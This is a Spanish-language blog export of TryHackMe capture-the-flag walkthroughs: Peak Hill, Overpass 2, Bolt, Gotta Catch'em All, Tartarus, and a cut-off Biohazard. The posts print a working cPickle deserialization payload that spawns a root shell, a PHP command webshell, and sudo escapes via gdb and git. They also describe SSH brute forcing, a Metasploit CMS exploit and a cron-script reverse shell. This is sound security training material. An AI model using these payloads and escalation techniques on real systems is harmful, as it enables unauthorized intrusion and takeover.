long_to_bytes(16[... REDACTED ...]36) \u0026gt;\u0026gt;\u0026gt; username b\u0026#39;dill\u0026#39; \u0026gt;\u0026gt;\u0026gt; password = long_to_bytes(2457[... REDACTED ...]2356) \u0026gt;\u0026gt;\u0026gt; password b\u0026#39;n[... REDACTED ...]t\u0026#39; \u0026gt;\u0026gt;\u0026gt; Nos conectamos al puerto y utilizamos las credenciales, logramos ejecutar comandos. Intentamos autenticarnos en la sesion de SSH que teniamos pero al parecer no es la misma contraseña.\nTambien logramos obtener nuestra flag user.txt.\nEn la carpeta principal de Dill encontramos su clave privada para poder ingresar por medio del servicio SSH.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el archivo /opt/peak_hill_farm/peak_hill_farm. Al ejecutar dicho archivo nos pide algo, al ingresar cualquier cosa nos devuelve un error, despues de multiples intentos nos devolvio el mensaje failed to decode base64.\nIngresamos un mensaje codificado pero no lo aceptó, intentamos mover el archivo a nuestra maquina pero no nos deja copiar o mover el archivo.\nEn el script nos habla de Peak Hill Farm tal vez se refiera nuevamente a pickle, como el archivo que encontramos en el servicio de FTP. Creamos un payload que nos va permitir ejecutar bash para obtener una shell root. Ver Pickle RCE\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026gt;\u0026gt;\u0026gt; import cPickle, base64, os, sys \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; class Exploit(object): ... def __init__(self, cmd): ... self.cmd = cmd ... def __reduce__(self): ... return (os.system, (self.cmd,)) ... \u0026gt;\u0026gt;\u0026gt; cmd = \u0026#34;/bin/bash\u0026#34; \u0026gt;\u0026gt;\u0026gt; exploit = base64.b64encode(cPickle.dumps(Exploit(cmd))) \u0026gt;\u0026gt;\u0026gt; exploit \u0026#39;Y3Bvc2l4CnN5c3RlbQpwMQooUycvYmluL2Jhc2gnCnAyCnRScDMKLg==\u0026#39; \u0026gt;\u0026gt;\u0026gt; Logramos obtener una shell root.\nPor alguna razon no logramos realizarle un cat al la flag root.txt por lo que agregamos clave de ssh al archivo authorized_keys para poder ingresar por este servicio y lograr leer nuestra flag.\nAl parecer el archivo tiene dos espacios a los lados (del nombre).\n","description":"Peak Hill es una maquina de TryHackMe, encontramos un fichero dentro del cual descubrimos credenciales las cuales estaban como un objeto, utilizamos Python para extraerlas y acceder por SSH. Decompilamos un archivo de Python y obtuvimos credenciales utilizando la libreria de Crypto lo que nos dio acceso al siguiente usuario. Finalmente encontramos un binario en el cual enviamos un objeto creado con Python y la libreria cPickle para ejecutar bash y obtener una shell como root.","id":105,"section":"posts","tags":["ftp","pickle","python"],"title":"TryHackMe - Peak Hill","uri":"https://sckull.github.io/posts/peakhill/"},{"content":"\rOverpass 2 - Hacked es una maquina de TryHackMe, es una serie de maquinas las cuales envuelven diferentes retos, en esta se presentan retos Crack the Hash y analisis de trafico lo que nos dio acceso por SSH. Finalmente escalamos privilegios con Bash e informacion de GTFOBins.\nRoom Titulo Overpass 2 - Hacked Descripción Overpass has been hacked! Can you analyse the attacker\u0026rsquo;s actions and hack back in? Puntos 131 Dificultad Facil Maker NinjaJc01 Overpass 2 - Hacked es una serie de retos en los que incluyen Analisis de Trafico con Wireshark y Password Cracking, además que una maquina fue hackeada Overpass.\nTASK 1 En el Task 1 se pueden utilizar los siguientes filtros: tcp.port == 4242, http.request.method == GET y http.request.method == POST.\nTASK 2 En el Task 2 es necesario realizar un analisis del Codigo del Backdoor y Password Cracking, este ultimo lo realizamos con hashcat utilizando hashcat64.bin -m 1710 -a 0 hash:salt ../rockyou.txt.\nTASK 3 A continuacion la solucion al Ultimo Task en el cual se ve envuelta la maquina que ha sido hackeada y con la ayuda del Task 1 y 2 podemos obtener acceso a la maquina.\nNMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22), http (80) y el puerto ssh (2222 backdoor) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 # Nmap 7.80 scan initiated Fri Aug 14 17:32:40 2020 as: nmap -sV -o mini_scan overpasstwo.thm Nmap scan report for overpasstwo.thm (10.10.27.236) Host is up (0.26s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 2222/tcp open ssh OpenSSH 8.2p1 Debian 4 (protocol 2.0) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Aug 14 17:33:22 2020 -- 1 IP address (1 host up) scanned in 41.69 seconds HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 kali@kali:~/thm/overpass2$ gobuster dir -u http://overpasstwo.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 250 -x php,html,txt /index.html (Status: 200) /img (Status: 301) /aboutus (Status: 301) /downloads (Status: 301) /css (Status: 301) /404.html (Status: 200) JAMES - USER En los Task 1 y 2 vemos que la persona que ingreso a la maquina dejo un backdoor, este backdoor esta a la escucha en el puerto 2222 el cual segun su codigo fuente solo espera por una contraseña para poder entrar en esta maquina utilizamos la contraseña crackeada, logramos obtener acceso a la maquina y la flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion de archivos SUID y encontramos el archivo .suid_bash, al ejecutar este binario nos devuelve una shell con el mismo usuario (james).\nVerificamos que tipo de archivo con el parametro --help y vemos que es bash.\nUtilizamos BASH - GTFOBins para obtener una shell con usuario root y nuestra flag root.txt.\n","description":"Overpass 2 - Hacked es una maquina de TryHackMe, es una serie de maquinas las cuales envuelven diferentes retos, en esta se presentan retos Crack the Hash y analisis de trafico lo que nos dio acceso por SSH. Finalmente escalamos privilegios con Bash e informacion de GTFOBins.","id":106,"section":"posts","tags":["suid"],"title":"TryHackMe - Overpass 2 - Hacked","uri":"https://sckull.github.io/posts/overpasstwo/"},{"content":"\rBolt es una maquina de TryHackMe. Bolt CMS presenta diferentes post que nos muestran credenciales además tiene una vulnerabilidad RCE autenticado la cual aprovechamos para obtener acceso privilegiado.\nRoom Titulo Bolt Descripción A hero is unleashed Puntos 56 Dificultad Facil Maker 0x9747 NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22), http (80) y http (8000) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 # Nmap 7.80 scan initiated Thu Aug 13 00:19:57 2020 as: nmap -sV -o mini_scan bolt.thm Nmap scan report for bolt.thm (10.10.172.52) Host is up (0.27s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 8000/tcp open http (PHP 7.2.32-1) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8000-TCP:V=7.80%I=7%D=8/13%Time=5F34CDB2%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,1001,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Thu,\\x2013\\x20Aug\\x20 SF:2020\\x2005:20:48\\x20GMT\\r\\nConnection:\\x20close\\r\\nX-Powered-By:\\x20PHP SF:/7\\.2\\.32-1\\+ubuntu18\\.04\\.1\\+deb\\.sury\\.org\\+1\\r\\nCache-Control:\\x20pu SF:blic,\\x20s-maxage=600\\r\\nDate:\\x20Thu,\\x2013\\x20Aug\\x202020\\x2005:20:48 SF:\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=UTF-8\\r\\nX-Debug-Toke SF:n:\\x20114ea1\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en-GB\\\u0026#34;\u0026gt;\\n\\x20\\ SF:x20\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;u SF:tf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;meta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\x20 SF:content=\\\u0026#34;width=device-width,\\x20initial-scale=1\\.0\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Bolt\\x20\\|\\x20A SF:\\x20hero\\x20is\\x20unleashed\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;l SF:ink\\x20href=\\\u0026#34;https://fonts\\.googleapis\\.com/css\\?family=Bitter\\|Roboto SF::400,400i,700\\\u0026#34;\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/theme/base-2018/css/bulma\\.css\\ SF:?8ca0842ebb\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;styleshe SF:et\\\u0026#34;\\x20href=\\\u0026#34;/theme/base-2018/css/theme\\.css\\?6cb66bfe9f\\\u0026#34;\u0026gt;\\n\\x20\\x20 SF:\\x20\\x20\\t\u0026lt;meta\\x20name=\\\u0026#34;generator\\\u0026#34;\\x20content=\\\u0026#34;Bolt\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x2 SF:0\\x20\\t\u0026lt;link\\x20rel=\\\u0026#34;canonical\\\u0026#34;\\x20href=\\\u0026#34;http://0\\.0\\.0\\.0:8000/\\\u0026#34;\u0026gt;\\ SF:n\\x20\\x20\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;body\\x20class=\\\u0026#34;front\\\u0026#34;\u0026gt;\\n\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;a\\x20\u0026#34;)%r(FourOhFourRequest,16C3,\u0026#34;HTTP/1 SF:\\.0\\x20404\\x20Not\\x20Found\\r\\nDate:\\x20Thu,\\x2013\\x20Aug\\x202020\\x2005: SF:20:50\\x20GMT\\r\\nConnection:\\x20close\\r\\nX-Powered-By:\\x20PHP/7\\.2\\.32-1 SF:\\+ubuntu18\\.04\\.1\\+deb\\.sury\\.org\\+1\\r\\nCache-Control:\\x20private,\\x20m SF:ust-revalidate\\r\\nDate:\\x20Thu,\\x2013\\x20Aug\\x202020\\x2005:20:50\\x20GMT SF:\\r\\nContent-Type:\\x20text/html;\\x20charset=UTF-8\\r\\npragma:\\x20no-cache SF:\\r\\nexpires:\\x20-1\\r\\nX-Debug-Token:\\x20561ff9\\r\\n\\r\\n\u0026lt;!doctype\\x20html SF:\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\u0026lt;meta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=device-width,\\x20initial SF:-scale=1\\.0\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\u0026lt;title\u0026gt;Bolt\\x20\\|\\x20A\\x20hero\\x20is\\x20unleashed\u0026lt;/title\u0026gt;\\n\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;link\\x20href=\\\u0026#34;https://fonts\\.googleapis\\ SF:.com/css\\?family=Bitter\\|Roboto:400,400i,700\\\u0026#34;\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\u0026gt;\\n SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/ SF:theme/base-2018/css/bulma\\.css\\?8ca0842ebb\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/theme/base-2018/css/them SF:e\\.css\\?6cb66bfe9f\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\t\u0026lt;meta\\x20name=\\\u0026#34;generator\\\u0026#34;\\x2 SF:0content=\\\u0026#34;Bolt\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;body\u0026gt;\\n\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;a\\x20href=\\\u0026#34;#main-content\\\u0026#34;\\x20class=\\\u0026#34;v SF:is\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Aug 13 00:21:16 2020 -- 1 IP address (1 host up) scanned in 78.40 seconds HTTP - PUERTO 80 Encontramos una pagina de Apache en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 root@upset:~/thm/bolt# gobuster dir -u http://bolt.thm -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403) HTTP - PUERTO 8000 Encontramos una pagina web en el puerto 80.\nEn las entradas de la pagina podemos leer algunos nombres de usuarios y contraseñas.\nSegunda entrada\nAdemás vemos que la pagina es el CMS BOLT.\nAl ingresar con las credenciales vemos la version de Bolt.\nBOLT Authenticated Remote Code Execution Buscamos alguna vulnerabilidad o exploit para este CMS, encontramos varias en searchsploit pero ninguna afectaba a la version de la maquina (searchsploit no estaba actualizado). En exploit-db.com encontramos un Exploit que afecta a este CMS, pero al intentar utilizar este exploit nos dio muchos errores, encontramos otro exploit para metasploit Bolt CMS 3.7.0 - Authenticated Remote Code Execution. Configuramos y ejecutamos el exploit con las credenciales que encontramos en las entradas.\nLogramos obtener una shell con usuario root y nuestra flag.\n","description":"Bolt es una maquina de TryHackMe. Bolt CMS presenta diferentes post que nos muestran credenciales además tiene una vulnerabilidad RCE autenticado la cual aprovechamos para obtener acceso privilegiado.","id":107,"section":"posts","tags":["CMS Bolt","rce"],"title":"TryHackMe - Bolt","uri":"https://sckull.github.io/posts/bolt/"},{"content":"\rGotta Catch\u0026rsquo;em All! es una maquina de TryHackMe, incluye analisis de codigo, ataque de fuerza bruta en SSH, finalmente el uso de credenciales almacenadas.\nRoom Titulo Gotta Catch\u0026rsquo;em All! Descripción This room is based on the original Pokemon series. Can you obtain all the Pokemon in this room? Puntos 270 Dificultad Facil Maker GhostlyPy NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 # Nmap 7.80 scan initiated Wed Aug 12 22:04:16 2020 as: nmap -sV -o mini_scan pokemoncatch.thm Nmap scan report for pokemoncatch.thm (10.10.166.58) Host is up (0.42s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 12 22:05:11 2020 -- 1 IP address (1 host up) scanned in 55.08 seconds HTTP Encontramos una pagina web de Apache en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 root@upset:~/thm/pokemoncatch# gobuster dir -u http://pokemoncatch.thm -w /usr/share/wordlists/dirb/common.txt -t 25 -q -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 301) /server-status (Status: 301) En el index de la pagina encontramos un script en Javascript en el que tiene 10 nombres de pokemon los cuales se imprimen en la consola.\nAdemás de ello encontramos unas etiquetas html que no existen.\nHYDRA - SSH Utilizamos los nombres de los pokemon y las etiquetas que encontramos para realizar un wordlist, y con hydra realizar un ataque de fuerza bruta a SSH.\nEncontramos las credenciales y obtuvimos una shell en la maquina.\nEn el Escritorio encontramos un archivo ZIP, dentro de este se encuentra la primera flag en hex.\nEn la carpeta de Videos encontramos un archivo en el que contiene codigo C++ el cual realiza una impresion en la que se ve el nombre de otro usuario y su contraseña. Utilizamos las credenciales para obtener una shell con este usuario, logramos obtener una shell y nos muestra un mensaje de error de man sudo_root y que debemos de utilizar sudo comando, además no podemos realizar un cd. Actualizamos nuestra shell a root y logramos tener acceso a la carpeta de root.\nEn la carpeta /var/www/html encontramos segunda flag la cual esta en Cifrado César.\nEncontramos la tercera flag en la carpeta /etc codificada en base64.\nFinalmente en /home encontramos la ultima flag.\n","description":"Gotta Catch'em All! es una maquina de TryHackMe, incluye analisis de codigo, ataque de fuerza bruta en SSH, finalmente el uso de credenciales almacenadas.","id":108,"section":"posts","tags":[],"title":"TryHackMe - Gotta Catch'em All!","uri":"https://sckull.github.io/posts/pokemon/"},{"content":"\rTartarus es una maquina de TryHackMe, realizamos ataque de fuerza bruta con Hydra y un wordlist con credenciales encontradas, con ello subimos una webshell y ejecutamos una shell inversa. Tras ejecutar una shell con GDB cambiamos a un segundo usuario. Ejecutamos Git junto con Sudo para acceder a otro usuario. Finalmente modificamos un script utilizado por un CronJob para obtener acfeso privilegiado.\nRoom Titulo Tartarus Descripción This is an beginner box based on simple enumeration of services and basic privilege escalation techniques. Puntos * Dificultad Facil Maker csenox NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 # Nmap 7.80 scan initiated Wed Aug 12 00:19:21 2020 as: nmap -sV -o mini_scan tartarus.thm Nmap scan report for tartarus.thm (10.10.50.182) Host is up (0.25s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 12 00:19:54 2020 -- 1 IP address (1 host up) scanned in 32.65 seconds FTP Ingresamos por el servicio FTP con las credenciales de anonymous (anonymous:anonymous), en donde encontramos dos archivos de texto el primero es posible verlo a simple vista, el segundo tenia un pequeño truco y es que las carpetas estaban con el nombre ....\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 root@upset:~/thm/tartarus# ftp tartarus.thm Connected to tartarus.thm. 220 (vsFTPd 3.0.3) Name (tartarus.thm:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 ftp ftp 4096 Jul 05 21:31 . drwxr-xr-x 3 ftp ftp 4096 Jul 05 21:31 .. drwxr-xr-x 3 ftp ftp 4096 Jul 05 21:31 ... -rw-r--r-- 1 ftp ftp 17 Jul 05 21:45 test.txt 226 Directory send OK. ftp\u0026gt; get test.txt local: test.txt remote: test.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for test.txt (17 bytes). 226 Transfer complete. 17 bytes received in 0.00 secs (197.6376 kB/s) ftp\u0026gt; cd ... 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. l150 Here comes the directory listing. s 226 Directory send OK. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 ftp ftp 4096 Jul 05 21:31 . drwxr-xr-x 3 ftp ftp 4096 Jul 05 21:31 .. drwxr-xr-x 2 ftp ftp 4096 Jul 05 21:31 ... 226 Directory send OK. ftp\u0026gt; cd ... 250 Directory successfully changed. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Jul 05 21:31 . drwxr-xr-x 3 ftp ftp 4096 Jul 05 21:31 .. -rw-r--r-- 1 ftp ftp 14 Jul 05 21:45 yougotgoodeyes.txt 226 Directory send OK. ftp\u0026gt; get yougotgoodeyes.txt local: yougotgoodeyes.txt remote: yougotgoodeyes.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for yougotgoodeyes.txt (14 bytes). 226 Transfer complete. 14 bytes received in 0.00 secs (26.3936 kB/s) ftp\u0026gt; pwd 257 \u0026#34;/.../...\u0026#34; is the current directory ftp\u0026gt; bye 221 Goodbye. root@upset:~/thm/tartarus# cat test.txt vsftpd test file root@upset:~/thm/tartarus# cat yougotgoodeyes.txt /[... REDACTED ...] root@upset:~/thm/tartarus# HTTP Encontramos una pagina web de apache en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 root@upset:~/thm/tartarus# gobuster dir -u http://tartarus.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) En robots.txt encontramos una direccion/pagina y un mensaje.\nEn la direccion que encontramos vemos dos archivos, en el primer archivo encontramos un wordlist de contraseñas en el segundo una lista de usuarios.\nEn el directorio que encontramos en el archivo de texto en FTP logramos ver un panel de logeo.\nHYDRA Utilizamos hydra para hacer un ataque de fuerza bruta al panel de logeo con los wordlists que encontramos. Vemos 16 posibles contraseñas para el usuario enox.\nEstas 16 posibles se muestran porque logramos encontrar el usuario pero no la contraseña, la sintaxis que utilizamos era para Incorrect username! y no para Incorrect password!. Volvemos a utilizar Hydra o probar la ultima contraseña.\nIngresamos con las credenciales vemos que podemos subir archivos.\nAl subir una imagen solo nos muestra el mensaje que se ha subido mas no la direccion donde esta se encuentra.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, esta vez en el directorio nuevo.\n1 2 3 4 5 root@upset:~/thm/tartarus# gobuster dir -u http://tartarus.thm/sUp3r-s3cr3t/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /home.php (Status: 302) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) USER - WWW-DATA Encontramos la direccion /images donde se encuentra otra carpeta y tambien nuestra imagen.\nAgregamos una shell a un archivo php y lo subimos, ejecutamos comandos.\n1 \u0026lt;?php echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; Ejecutamos una shell inversa y logramos obtener una shell con el usuario www-data.\nEn el directorio de d4rckh encontramos nuestra flag user.txt.\nUSER - THIRTYTWO Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos con sudo pero con el usuario thirtytwo para ejecutar el comando /var/www/gdb, utilizamos gdb.\nEjecutamos el comando y logramos obtener una shell con este usario.\n1 sudo -u thirtytwo /var/www/gdb -nx -ex \u0026#39;!sh\u0026#39; -ex quit USER - d4rckh Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos con sudo pero con el usuario d4rckh para ejecutar el comando git.\nAdemás en la carpeta principal de thirtytwo encontramos una nota donde habla de git.\nUtilizamos git. Ejecutamos el comando y logramos obtener una shell con el usuario d4rckh.\n1 2 sudo -u d4rckh /usr/bin/git -p help config #!/bin/sh PRIVILEGE ESCALATION En la carpeta principal de d4rckh encontramos un script de python que elimina todo lo que esté en /home/cleanup/. Además este mismo script es ejecutado por el usuario root en un cron.\n1 2 3 4 5 6 7 8 9 #cleanup.py # -*- coding: utf-8 -*- #!/usr/bin/env python import os import sys try: os.system(\u0026#39;rm -r /home/cleanup/* \u0026#39;) except: sys.exit() El script tiene permisos 777 por lo que cualquiera puede leer, escribir y ejecutar. Renombramos el archivo existente y creamos uno nuevo con una shell inversa (python).\nLogramos obtener una shell con usuario root y nuestra flag root.txt.\n","description":"Tartarus es una maquina de TryHackMe, realizamos ataque de fuerza bruta con Hydra y un wordlist con credenciales encontradas, con ello subimos una webshell y ejecutamos una shell inversa. Tras ejecutar una shell con GDB cambiamos a un segundo usuario. Ejecutamos Git junto con Sudo para acceder a otro usuario. Finalmente modificamos un script utilizado por un CronJob para obtener acfeso privilegiado.","id":109,"section":"posts","tags":["ftp","gdb","cron"],"title":"TryHackMe - Tartarus","uri":"https://sckull.github.io/posts/tartarus/"},{"content":"\rBiohazard es una maquina de TryHackMe, enfocada a la tematica de Resident Evil presenta una serie de retos que permitieron el acceso a la maquina. Escalamos privilegios utilizando sudo.\nRoom Titulo Biohazard Descripción A CTF room based on the old-time survival horror game, Resident Evil. Can you survive until the end? Puntos 980 Dificultad Media Maker DesKel NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 # Nmap 7.80 scan initiated Tue Aug 11 17:52:02 2020 as: nmap -sV -o mini_scan biohazard.thm Nmap scan report for biohazard.thm (10.10.159.66) Host is up (0.25s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Aug 11 17:52:52 2020 -- 1 IP address (1 host up) scanned in 49.51 seconds HTTP Encontramos una pagina web en el puerto 80.\nNIGHTMARE Esta pagina nos lleva hacia otra /mansionmain/ donde encontramos otra direccion en un comentario del codigo fuente.\nEn la nueva pagina encontramos un input donde debemos de ingresar un \u0026ldquo;emblema\u0026rdquo;.\nTambien encontramos en el codigo fuente una cadena codificada en base64, que al decodificarla nos muestra una nueva direccion.\nEn esta nueva direccion encontramos otra /artRoom/, además otra pagina que contiene un Lockpick.\nEn /artRoom/, vemos una nueva pagina que al visitarla encontramos la direccion o \u0026ldquo;el mapa\u0026rdquo; de la mansion.\n/diningRoom2F/, en esta direccion encontramos un mensaje codificado en un comentario del codigo fuente de la pagina.\nUtilizamos dcode.fr para obtener el mensaje codificado en el que nos indican una pagina donde podemos encontrar la gema azul.\nBlue Jewel\nEn /galleryRoom/ encontramos una nota en la que indica que los mensajes estan codificados, el primer crest contiene 18 letras decodificado y que debemos encontrar 4 crest para obtener el mensaje y la combinacion es: crest 1 + crest 2 + crest 3 + crest 4.\nUtilizamos CyberCheff para obtener el crest 2.\nEn /barRoom/ debemos de ingresar la falg lockpick, es la que encontramos en /artRoom/, al ingresarla nos redirige a una nueva pagina donde vemos nuevamente un input y una nota musical codificada.\nNOTA Musical\nUtilizamos CyberCheff para decodificar la cadena, en donde nos muestra una nueva \u0026ldquo;flag\u0026rdquo;.\nAl ingresar la \u0026ldquo;flag\u0026rdquo; en el input que encontramos nos redirige nuevamente a otra pagina donde vemos el emblema de oro y además nos muestra la pagina donde encontramos la \u0026ldquo;flag\u0026rdquo; y que debemos de regresar a la pagina anterior (en donde pide el emblema) e ingresar la \u0026ldquo;flag\u0026rdquo;.\nEmblema de ORO\nRegresamos a /diningRoom/ nuevamente e ingresamos la \u0026ldquo;flag\u0026rdquo; del emblema de oro, nos devuelve un mensaje.\nUtilizamos dcode.fr para obtener el mansaje donde nos indica la pagina donde esta la Shield key.\nVisitamos la pagina donde nos indica y vemos la \u0026ldquo;flag\u0026rdquo;.\nEn /attic/ nos pide ingresar el Shield key que supuestamente esta incrustado en la puerta, al ingresar la \u0026ldquo;flag\u0026rdquo; nos redirige hacia otra pagina donde encontramos otra nota en donde encontramos otro crest.\nUtilizamos CyberCheff para obtener el crest 4.\nEn /tigerStatusRoom/ nos pide una gema, ingresamos la \u0026ldquo;flag\u0026rdquo; Blue Jewel y nos devuelve un mensaje donde se encuentra el crest 1.\nUtilizamos CyberCheff para obtener el crest 1.\nEn /armorRoom/ nos pide tambien Shield key ingresamos y tambien, encontramos una nota en la nueva pagina, en donde encontramos la ultima crest.\nUtilizamos CyberCheff para obtener el crest 3.\nCRESTS Una vez con todas las crest encontradas utilizamos la combinacion dada, al decodificar el mensaje nos muestra unas credenciales para el servicio FTP.\nFTP Ingresamos por el servicio FTP con las credenciales que encontramos varios archivos entre ellos 3 imagenes jpg, un archivo de texto y una clave gpg.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 